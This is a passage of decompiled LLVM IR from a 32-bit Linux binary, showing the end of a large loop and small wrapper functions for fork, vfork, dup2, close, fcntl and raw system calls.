  %v2_804e116 = inttoptr i32 %v1_804e116 to i32*
  store i32 0, i32* %v2_804e116, align 4
  %v1_804e118 = inttoptr i32 %v6_804d252 to i32*
  %v2_804e118 = call i32 @function_80504b0(i32* %v1_804e118)
  store i32 %v2_804e118, i32* @esi, align 4
  %v0_804e125 = load i32, i32* @ebx, align 4
  %v2_804e135 = mul i32 %v0_804e125, 28
  %v1_804e139 = add i32 %v2_804df11, %v2_804e135
  %v2_804e13c = inttoptr i32 %v1_804e139 to i32*
  store i32 %v2_804e118, i32* %v2_804e13c, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804e154 = inttoptr i32 %v2_804d203 to i32*
  %v4_804e154 = load i32, i32* %v3_804e154, align 4
  store i32 %v4_804e154, i32* %eax.global-to-local, align 4
  %v0_804e157 = load i32, i32* @esp, align 4
  %v1_804e157 = add i32 %v0_804e157, -4
  %v2_804e157 = inttoptr i32 %v1_804e157 to i32*
  store i32 16384, i32* %v2_804e157, align 4
  %v1_804e15c = add i32 %v0_804e157, -8
  %v2_804e15c = inttoptr i32 %v1_804e15c to i32*
  store i32 425, i32* %v2_804e15c, align 4
  %v1_804e161 = add i32 %v0_804e157, -12
  %v2_804e161 = inttoptr i32 %v1_804e161 to i32*
  store i32 ptrtoint ([485 x i8]* @global_var_805ac10.299 to i32), i32* %v2_804e161, align 4
  %v0_804e166 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e166 = add i32 %v0_804e157, -16
  %v3_804e166 = inttoptr i32 %v2_804e166 to i32*
  store i32 %v0_804e166, i32* %v3_804e166, align 4
  %v4_804e167 = call i32 @function_8051d08(i32 %stack_var_-624.237, i32 %stack_var_-620.238, i32 %v2_804d124, i32 %v6_804d252)
  %v0_804e16c = load i32, i32* @esp, align 4
  %v2_804e16f = icmp slt i32 %v4_804e167, 0
  %v1_804e171 = icmp eq i1 %v2_804e16f, false
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804e171, label %dec_label_pc_804e1d3, label %dec_label_pc_804e173

dec_label_pc_804e173:                             ; preds = %dec_label_pc_804e110
  %v4_804e189 = load i32, i32* %v3_804e154, align 4
  store i32 %v4_804e189, i32* %eax.global-to-local, align 4
  %v3_804e18f = inttoptr i32 %v0_804e16c to i32*
  store i32 %v4_804e189, i32* %v3_804e18f, align 4
  %v1_804e190 = call i32 @function_804d02b(i32 %stack_var_-624.237)
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804e1c9 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804e1c9 = inttoptr i32 %v3_804e1c9 to i8*
  store i8 1, i8* %v4_804e1c9, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804e1d3:                             ; preds = %dec_label_pc_804e110
  %v3_804e1e9 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804e1e9 = inttoptr i32 %v3_804e1e9 to i8*
  store i8 3, i8* %v4_804e1e9, align 1
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v1_804d205, i32* %eax.global-to-local, align 4
  %v2_804e209 = load i32, i32* %v1_804d208, align 4
  store i32 %v2_804e209, i32* %eax.global-to-local, align 4
  %v1_804e20b = add i32 %v2_804e209, 60
  store i32 %v1_804e20b, i32* @ebx, align 4
  %v0_804e20e = load i32, i32* @esp, align 4
  %v1_804e211 = add i32 %v0_804e20e, -16
  %v2_804e211 = inttoptr i32 %v1_804e211 to i32*
  store i32 0, i32* %v2_804e211, align 4
  %v1_804e213 = inttoptr i32 %stack_var_-624.237 to i32*
  %v2_804e213 = call i32 @function_80504b0(i32* %v1_804e213)
  store i32 %v2_804e213, i32* %eax.global-to-local, align 4
  %v0_804e21b = load i32, i32* @ebx, align 4
  %v7_804e21b = icmp ult i32 %v0_804e21b, %v2_804e213
  %v1_804e21d = icmp eq i1 %v7_804e21b, false
  br i1 %v1_804e21d, label %dec_label_pc_804e255, label %dec_label_pc_804e21f

dec_label_pc_804e21f:                             ; preds = %dec_label_pc_804e1d3
  store i8 0, i8* %v4_804d252, align 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804e1e9, align 1
  br label %dec_label_pc_804e255

dec_label_pc_804e255:                             ; preds = %dec_label_pc_804d23c, %dec_label_pc_804e1d3, %dec_label_pc_804e010, %dec_label_pc_804dcc2, %dec_label_pc_804da31, %dec_label_pc_804d8d9, %dec_label_pc_804d45c, %dec_label_pc_804e173, %dec_label_pc_804e0f0, %dec_label_pc_804e0b5, %dec_label_pc_804e045, %dec_label_pc_804df65, %dec_label_pc_804df45, %dec_label_pc_804de70, %dec_label_pc_804de35, %dec_label_pc_804ddc8, %dec_label_pc_804dcf7, %dec_label_pc_804dca2, %dec_label_pc_804dc82, %dec_label_pc_804dbdf, %dec_label_pc_804dba4, %dec_label_pc_804db37, %dec_label_pc_804da66, %dec_label_pc_804da11, %dec_label_pc_804d9f1, %dec_label_pc_804d90e, %dec_label_pc_804d879, %dec_label_pc_804d788, %dec_label_pc_804d728, %dec_label_pc_804d5dc, %dec_label_pc_804d597, %dec_label_pc_804d43c, %dec_label_pc_804d3fe, %dec_label_pc_804e21f
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.237, %dec_label_pc_804d23c ], [ %stack_var_-624.237, %dec_label_pc_804e1d3 ], [ %stack_var_-624.237, %dec_label_pc_804e21f ], [ %stack_var_-624.237, %dec_label_pc_804e173 ], [ %stack_var_-624.237, %dec_label_pc_804e0f0 ], [ %stack_var_-624.237, %dec_label_pc_804e0b5 ], [ %stack_var_-624.237, %dec_label_pc_804e010 ], [ %stack_var_-624.237, %dec_label_pc_804e045 ], [ %stack_var_-624.237, %dec_label_pc_804df65 ], [ %stack_var_-624.237, %dec_label_pc_804df45 ], [ %v4_804dd51, %dec_label_pc_804de70 ], [ %v4_804dd51, %dec_label_pc_804de35 ], [ %v4_804dd51, %dec_label_pc_804ddc8 ], [ %stack_var_-624.237, %dec_label_pc_804dcc2 ], [ %stack_var_-624.237, %dec_label_pc_804dcf7 ], [ %stack_var_-624.237, %dec_label_pc_804dca2 ], [ %stack_var_-624.237, %dec_label_pc_804dc82 ], [ %stack_var_-624.237, %dec_label_pc_804dbdf ], [ %stack_var_-624.237, %dec_label_pc_804dba4 ], [ %stack_var_-624.237, %dec_label_pc_804db37 ], [ %stack_var_-624.237, %dec_label_pc_804da31 ], [ %stack_var_-624.237, %dec_label_pc_804da66 ], [ %stack_var_-624.237, %dec_label_pc_804da11 ], [ %stack_var_-624.237, %dec_label_pc_804d9f1 ], [ %stack_var_-624.237, %dec_label_pc_804d8d9 ], [ %stack_var_-624.237, %dec_label_pc_804d90e ], [ %stack_var_-624.237, %dec_label_pc_804d879 ], [ %stack_var_-624.237, %dec_label_pc_804d788 ], [ %stack_var_-624.237, %dec_label_pc_804d728 ], [ %stack_var_-624.237, %dec_label_pc_804d45c ], [ %stack_var_-624.237, %dec_label_pc_804d5dc ], [ %stack_var_-624.237, %dec_label_pc_804d597 ], [ %stack_var_-624.237, %dec_label_pc_804d43c ], [ %stack_var_-624.237, %dec_label_pc_804d3fe ]
  %stack_var_-620.1 = phi i32 [ %stack_var_-620.238, %dec_label_pc_804d23c ], [ %stack_var_-620.238, %dec_label_pc_804e1d3 ], [ %stack_var_-620.238, %dec_label_pc_804e21f ], [ %stack_var_-620.238, %dec_label_pc_804e173 ], [ %stack_var_-620.238, %dec_label_pc_804e0f0 ], [ %stack_var_-620.238, %dec_label_pc_804e0b5 ], [ %stack_var_-620.238, %dec_label_pc_804e010 ], [ %stack_var_-620.238, %dec_label_pc_804e045 ], [ %stack_var_-620.238, %dec_label_pc_804df65 ], [ %stack_var_-620.238, %dec_label_pc_804df45 ], [ %stack_var_-620.238, %dec_label_pc_804de70 ], [ %stack_var_-620.238, %dec_label_pc_804de35 ], [ %stack_var_-620.238, %dec_label_pc_804ddc8 ], [ %stack_var_-620.238, %dec_label_pc_804dcc2 ], [ %stack_var_-620.238, %dec_label_pc_804dcf7 ], [ %stack_var_-620.238, %dec_label_pc_804dca2 ], [ %stack_var_-620.238, %dec_label_pc_804dc82 ], [ %v4_804dac0, %dec_label_pc_804dbdf ], [ %v4_804dac0, %dec_label_pc_804dba4 ], [ %v4_804dac0, %dec_label_pc_804db37 ], [ %stack_var_-620.238, %dec_label_pc_804da31 ], [ %stack_var_-620.238, %dec_label_pc_804da66 ], [ %stack_var_-620.238, %dec_label_pc_804da11 ], [ %stack_var_-620.238, %dec_label_pc_804d9f1 ], [ %stack_var_-620.238, %dec_label_pc_804d8d9 ], [ %stack_var_-620.238, %dec_label_pc_804d90e ], [ %stack_var_-620.238, %dec_label_pc_804d879 ], [ %stack_var_-620.238, %dec_label_pc_804d788 ], [ %stack_var_-620.238, %dec_label_pc_804d728 ], [ %stack_var_-620.238, %dec_label_pc_804d45c ], [ %stack_var_-620.238, %dec_label_pc_804d5dc ], [ %stack_var_-620.238, %dec_label_pc_804d597 ], [ %stack_var_-620.238, %dec_label_pc_804d43c ], [ %stack_var_-620.238, %dec_label_pc_804d3fe ]
  %v4_804e255 = add nuw nsw i32 %storemerge39, 1
  %v15_804e25b = icmp eq i32 %v4_804e255, 512
  br i1 %v15_804e25b, label %dec_label_pc_804d1e1, label %dec_label_pc_804d1ed

; uselistorder directives
  uselistorder i32 %v4_804e255, { 1, 0, 2 }
  uselistorder i32 %v0_804ddc1, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804db30, { 3, 0, 1, 2 }
  uselistorder i32 %v13_804d7b3, { 1, 0 }
  uselistorder i32 %v0_804d7ae, { 2, 0, 1 }
  uselistorder i32 %v0_804d6c3, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v5_804d6be, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804d66d, { 1, 0 }
  uselistorder i32 %v2_804d651, { 1, 0 }
  uselistorder i32 %v0_804d555, { 2, 0, 1 }
  uselistorder i32 %v12_804d52d, { 1, 0 }
  uselistorder i32 %v0_804d528, { 2, 0, 1 }
  uselistorder i32 %v0_804d46f, { 2, 0, 1 }
  uselistorder i32 %v2_804d2bc, { 1, 0 }
  uselistorder i32 %v6_804d252, { 10, 11, 9, 8, 6, 7, 5, 3, 4, 2, 1, 13, 12, 14, 0 }
  uselistorder i8* %v4_804d252, { 22, 23, 20, 21, 17, 18, 19, 14, 15, 16, 11, 12, 13, 8, 9, 10, 5, 6, 7, 1, 2, 3, 4, 0, 24 }
  uselistorder i32* %v1_804d208, { 6, 5, 4, 3, 1, 2, 0, 7 }
  uselistorder i32 %v1_804d205, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v2_804d203, { 21, 20, 16, 17, 18, 19, 15, 12, 13, 14, 11, 8, 9, 10, 5, 6, 7, 0, 1, 3, 2, 4, 22 }
  uselistorder i32 %v2_804d201, { 23, 0, 1, 22, 24, 25, 2, 26, 27, 28, 3, 32, 29, 5, 30, 4, 31, 33, 6, 35, 36, 7, 34, 37, 38, 39, 8, 40, 9, 42, 41, 43, 10, 45, 46, 11, 44, 47, 48, 49, 12, 50, 13, 52, 51, 53, 14, 60, 61, 15, 59, 62, 55, 56, 16, 54, 57, 58, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 18, 75, 17, 76, 77, 19, 78, 80, 20, 79, 21 }
  uselistorder i32 %v1_804d1f3, { 1, 2, 0, 3, 4, 5, 6, 7, 13, 14, 8, 9, 10, 11, 12, 15, 16, 18, 19, 17, 20, 21, 22, 23, 25, 24, 26, 27, 28, 30, 31, 29, 32, 33, 34, 35, 37, 36, 38, 39, 40, 48, 49, 47, 50, 42, 43, 44, 41, 45, 46, 51, 52, 53, 56, 54, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70 }
  uselistorder i32 %stack_var_-624.237, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 11, 10, 8, 7, 6, 4, 3, 0, 2, 5, 1, 9, 14, 13, 12 }
  uselistorder i32 %stack_var_-620.238, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 19, 18, 16, 15, 14, 11, 10, 8, 7, 6, 5, 4, 3, 2, 0, 1, 9, 13, 12, 17, 20 }
  uselistorder i32 %storemerge39, { 0, 3, 4, 5, 6, 7, 9, 8, 1, 2 }
  uselistorder i32 %v2_804df11, { 1, 2, 0 }
  uselistorder i32 %v4_804d1d2, { 1, 0, 2 }
  uselistorder i32 %storemerge141, { 1, 0 }
  uselistorder i32 %v2_804d1ad, { 1, 0, 2, 3, 5, 4, 6, 8, 7, 9, 12, 11, 10, 13, 14 }
  uselistorder i32 %v2_804d124, { 10, 12, 11, 14, 13, 5, 6, 15, 0, 1, 2, 3, 7, 4, 8, 9 }
  uselistorder i32 %v1_804d0d0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-320, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-192, { 6, 3, 1, 2, 5, 4, 0, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 2, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 72, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 54, 55, 52, 56, 57, 58, 59, 61, 60, 62, 63, 65, 64, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 78, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 93, 94, 92, 95, 96, 97, 98, 99, 100, 101, 104, 102, 103, 105, 106, 107, 108, 109, 110, 111, 112, 114, 113, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 141, 156, 157, 158, 159, 160, 161, 162, 0, 175, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 182, 176, 177, 178, 179, 180, 181 }
  uselistorder i32 (i32, i32)* @function_8048b7f, { 1, 0 }
  uselistorder i8* bitcast ([10 x i8*]* @global_var_8056dee.11 to i8*), { 1, 0 }
  uselistorder i32 (i32)* @function_8048427, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_8048524, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_8051c98, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_80503f0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -24, { 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i32 -20, { 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_804d02b, { 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 0 }
  uselistorder i8 6, { 1, 0 }
  uselistorder i8 5, { 1, 0 }
  uselistorder i32 2560, { 1, 0 }
  uselistorder i32 513, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_80517c0, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_80482d8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e255, { 33, 1, 7, 8, 9, 10, 2, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804d23c, { 1, 0 }
  uselistorder label %dec_label_pc_804d1ed, { 1, 0 }
  uselistorder label %dec_label_pc_804d159, { 1, 0 }
}

define i32 @function_804fffc() local_unnamed_addr {
dec_label_pc_804fffc:
  %v0_8050002 = call i32 @vfork()
  %v5_8050005 = icmp ult i32 %v0_8050002, -4095
  %v1_805000a = icmp eq i1 %v5_8050005, false
  call void @__pseudo_cond_branch(i1 %v1_805000a, i32 134559976)
  ret i32 %v0_8050002
}

define i32 @function_8050014(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050014:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8050014 = load i32, i32* @edi, align 4
  %v0_8050015 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050029 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_8050033 = icmp ugt i32 %v1_8050029, 2
  br i1 %v6_8050033, label %dec_label_pc_8050043, label %dec_label_pc_8050035

dec_label_pc_8050035:                             ; preds = %dec_label_pc_8050014
  %v4_8050039 = call i32 @function_805006c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8050029)
  br label %dec_label_pc_8050065

dec_label_pc_8050043:                             ; preds = %dec_label_pc_8050014
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_805004b = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_805004b, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_805004b, -4095
  br i1 %tmp17, label %dec_label_pc_8050063, label %dec_label_pc_8050057

dec_label_pc_8050057:                             ; preds = %dec_label_pc_8050043
  %v1_8050057 = call i32 @function_8050568(i32 %v0_8050015)
  %v0_805005c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805005c = sub i32 0, %v0_805005c
  %v2_805005e = inttoptr i32 %v1_8050057 to i32*
  store i32 %v1_805005c, i32* %v2_805005e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050063

dec_label_pc_8050063:                             ; preds = %dec_label_pc_8050043, %dec_label_pc_8050057
  %v0_8050063 = phi i32 [ %v2_805004b, %dec_label_pc_8050043 ], [ -1, %dec_label_pc_8050057 ]
  br label %dec_label_pc_8050065

dec_label_pc_8050065:                             ; preds = %dec_label_pc_8050035, %dec_label_pc_8050063
  %v0_805006a = phi i32 [ %v4_8050039, %dec_label_pc_8050035 ], [ %v0_8050063, %dec_label_pc_8050063 ]
  store i32 %v0_8050015, i32* @ebx, align 4
  store i32 %v0_8050014, i32* @edi, align 4
  ret i32 %v0_805006a

; uselistorder directives
  uselistorder i32 %v2_805004b, { 1, 0, 2 }
  uselistorder i32 %v0_8050015, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050065, { 1, 0 }
  uselistorder label %dec_label_pc_8050063, { 1, 0 }
}

define i32 @function_805006c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805006c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805006c = load i32, i32* @edi, align 4
  store i32 %v0_805006c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8050084 = load i32, i32* @ebx, align 4
  %v1_805008c = call i32 @int80_syscall(i32 221)
  store i32 %v1_805008c, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_805008c, -4095
  br i1 %tmp12, label %dec_label_pc_80500a4, label %dec_label_pc_8050098

dec_label_pc_8050098:                             ; preds = %dec_label_pc_805006c
  %v1_8050098 = call i32 @function_8050568(i32 %v0_8050084)
  %v0_805009d = load i32, i32* %edi.global-to-local, align 4
  %v1_805009d = sub i32 0, %v0_805009d
  %v2_805009f = inttoptr i32 %v1_8050098 to i32*
  store i32 %v1_805009d, i32* %v2_805009f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80500a9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80500a4

dec_label_pc_80500a4:                             ; preds = %dec_label_pc_805006c, %dec_label_pc_8050098
  %v2_80500a9 = phi i32 [ %v0_805006c, %dec_label_pc_805006c ], [ %v2_80500a9.pre, %dec_label_pc_8050098 ]
  %v0_80500a4 = phi i32 [ %v1_805008c, %dec_label_pc_805006c ], [ -1, %dec_label_pc_8050098 ]
  store i32 %v2_80500a9, i32* %edi.global-to-local, align 4
  ret i32 %v0_80500a4

; uselistorder directives
  uselistorder i32 %v1_805008c, { 1, 0, 2 }
  uselistorder i32 221, { 1, 0 }
  uselistorder label %dec_label_pc_80500a4, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_80500ac(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_80500ac:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8050138(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050138:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050138 = load i32, i32* @edi, align 4
  store i32 %v0_8050138, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050140 = load i32, i32* @ebx, align 4
  %v1_8050148 = call i32 @close(i32 %arg1)
  store i32 %v0_8050140, i32* @ebx, align 4
  store i32 %v1_8050148, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8050148, -4095
  br i1 %tmp9, label %dec_label_pc_8050160, label %dec_label_pc_8050154

dec_label_pc_8050154:                             ; preds = %dec_label_pc_8050138
  %v1_8050154 = call i32 @function_8050568(i32 %v0_8050140)
  %v0_8050159 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050159 = sub i32 0, %v0_8050159
  %v2_805015b = inttoptr i32 %v1_8050154 to i32*
  store i32 %v1_8050159, i32* %v2_805015b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050164.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050160

dec_label_pc_8050160:                             ; preds = %dec_label_pc_8050138, %dec_label_pc_8050154
  %v2_8050164 = phi i32 [ %v0_8050138, %dec_label_pc_8050138 ], [ %v2_8050164.pre, %dec_label_pc_8050154 ]
  %v0_8050160 = phi i32 [ %v1_8050148, %dec_label_pc_8050138 ], [ -1, %dec_label_pc_8050154 ]
  %v2_8050162 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050162, i32* @edx, align 4
  store i32 %v2_8050164, i32* @edi, align 4
  ret i32 %v0_8050160

; uselistorder directives
  uselistorder i32 %v1_8050148, { 1, 0, 2 }
  uselistorder i32 %v0_8050140, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050160, { 1, 0 }
}

define i32 @function_8050168(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050168:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050168 = load i32, i32* @ebx, align 4
  store i32 %v0_8050168, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_805017b = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_805017b, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_805017b, -4095
  br i1 %tmp9, label %dec_label_pc_8050194, label %dec_label_pc_8050188

dec_label_pc_8050188:                             ; preds = %dec_label_pc_8050168
  %v1_8050188 = call i32 @function_8050568(i32 %v0_8050168)
  %v0_805018d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805018d = sub i32 0, %v0_805018d
  %v2_805018f = inttoptr i32 %v1_8050188 to i32*
  store i32 %v1_805018d, i32* %v2_805018f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8050198.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050194

dec_label_pc_8050194:                             ; preds = %dec_label_pc_8050168, %dec_label_pc_8050188
  %v2_8050198 = phi i32 [ %v0_8050168, %dec_label_pc_8050168 ], [ %v2_8050198.pre, %dec_label_pc_8050188 ]
  %v0_8050194 = phi i32 [ %v2_805017b, %dec_label_pc_8050168 ], [ -1, %dec_label_pc_8050188 ]
  store i32 %v2_8050198, i32* @ebx, align 4
  ret i32 %v0_8050194

; uselistorder directives
  uselistorder i32 %v2_805017b, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050194, { 1, 0 }
}

define i32 @function_805019c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805019c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805019c = load i32, i32* @ebx, align 4
  store i32 %v0_805019c, i32* %stack_var_-4, align 4
  %v1_80501a5 = call i32 @fork(i32 %v0_805019c)
  store i32 %v1_80501a5, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80501a5, -4095
  br i1 %tmp7, label %dec_label_pc_80501bc, label %dec_label_pc_80501b0

dec_label_pc_80501b0:                             ; preds = %dec_label_pc_805019c
  %v1_80501b0 = call i32 @function_8050568(i32 %v0_805019c)
  %v0_80501b5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80501b5 = sub i32 0, %v0_80501b5
  %v2_80501b7 = inttoptr i32 %v1_80501b0 to i32*
  store i32 %v1_80501b5, i32* %v2_80501b7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80501c0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80501bc

dec_label_pc_80501bc:                             ; preds = %dec_label_pc_805019c, %dec_label_pc_80501b0
  %v2_80501c0 = phi i32 [ %v0_805019c, %dec_label_pc_805019c ], [ %v2_80501c0.pre, %dec_label_pc_80501b0 ]
  %v0_80501bc = phi i32 [ %v1_80501a5, %dec_label_pc_805019c ], [ -1, %dec_label_pc_80501b0 ]
  store i32 %v2_80501c0, i32* @ebx, align 4
  ret i32 %v0_80501bc

; uselistorder directives
  uselistorder i32 %v1_80501a5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80501bc, { 1, 0 }
}

define i32 @function_80501c4() local_unnamed_addr {
dec_label_pc_80501c4:
  %stack_var_-8 = alloca i32, align 4
  %v2_80501c7 = ptrtoint i32* %stack_var_-8 to i32
  %v2_80501ce = call i32 @function_805023c(i32 7, i32 %v2_80501c7)
  store i32 256, i32* @edx, align 4
  %v2_80501db = icmp slt i32 %v2_80501ce, 0
  br i1 %v2_80501db, label %dec_label_pc_80501e3, label %dec_label_pc_80501df

dec_label_pc_80501df:                             ; preds = %dec_label_pc_80501c4
  %v3_80501df = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80501df, i32* @edx, align 4
  br label %dec_label_pc_80501e3

dec_label_pc_80501e3:                             ; preds = %dec_label_pc_80501c4, %dec_label_pc_80501df
  %v0_80501e3 = phi i32 [ 256, %dec_label_pc_80501c4 ], [ %v3_80501df, %dec_label_pc_80501df ]
  ret i32 %v0_80501e3

; uselistorder directives
  uselistorder label %dec_label_pc_80501e3, { 1, 0 }
}

define i32 @function_80501ec() local_unnamed_addr {
dec_label_pc_80501ec:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80501ec = load i32, i32* @ebx, align 4
  store i32 %v0_80501ec, i32* %stack_var_-4, align 4
  %v1_80501f5 = call i32 @int80_syscall(i32 201)
  store i32 %v1_80501f5, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80501f5, -4095
  br i1 %tmp7, label %dec_label_pc_805020c, label %dec_label_pc_8050200

dec_label_pc_8050200:                             ; preds = %dec_label_pc_80501ec
  %v1_8050200 = call i32 @function_8050568(i32 %v0_80501ec)
  %v0_8050205 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050205 = sub i32 0, %v0_8050205
  %v2_8050207 = inttoptr i32 %v1_8050200 to i32*
  store i32 %v1_8050205, i32* %v2_8050207, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8050210.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805020c

dec_label_pc_805020c:                             ; preds = %dec_label_pc_80501ec, %dec_label_pc_8050200
  %v2_8050210 = phi i32 [ %v0_80501ec, %dec_label_pc_80501ec ], [ %v2_8050210.pre, %dec_label_pc_8050200 ]
  %v0_805020c = phi i32 [ %v1_80501f5, %dec_label_pc_80501ec ], [ -1, %dec_label_pc_8050200 ]
  store i32 %v2_8050210, i32* @ebx, align 4
  ret i32 %v0_805020c

; uselistorder directives
  uselistorder i32 %v1_80501f5, { 1, 0, 2 }
